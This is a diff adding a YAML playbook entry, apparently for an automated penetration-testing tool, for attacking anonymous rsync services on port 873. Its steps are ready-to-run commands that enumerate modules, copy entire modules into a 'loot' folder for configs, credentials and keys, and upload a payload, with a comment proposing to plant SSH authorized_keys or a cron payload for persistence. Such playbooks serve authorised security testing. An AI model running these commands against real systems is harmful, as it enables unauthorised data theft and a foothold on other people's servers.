@@ -1,0 +1,32 @@
+id: service_rsync_anon
+title: "rsync — anonymous module enum + file copy"
+phase: recon
+mitre: ["T1083", "T1135"]
+trigger:
+  services: ["rsync"]
+  ports:    [873]
+keywords: ["rsync", "rsync module", "rsync anonymous"]
+preconditions:
+  - "TCP/873 reachable"
+steps:
+  - tool: nmap
+    cmd:  "nmap -sV -p873 --script=rsync-list-modules {target}"
+    why:  "List exported modules without auth"
+  - tool: rsync
+    cmd:  "rsync --list-only rsync://{target}/"
+    why:  "Module list manually"
+  - tool: rsync
+    cmd:  "rsync -av --list-only rsync://{target}/{module}/"
+    why:  "Per-module recursive listing"
+  - tool: rsync
+    cmd:  "rsync -av rsync://{target}/{module}/ ./loot-{module}/"
+    why:  "Pull entire module — backups often contain configs, creds, keys"
+  - tool: rsync
+    cmd:  "rsync -av ./payload.sh rsync://{target}/{module}/"
+    why:  "Write test — if accepted, drop SSH authorized_keys / cron payload"
+expected_outcome: "Read access to backup/share modules; sometimes write access for further exploitation"
+fallbacks:
+  - "If pre-shared secret required → check leaked configs from other hosts"
+  - "Common module names: backup, src, www, data, public, share, tmp"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync"
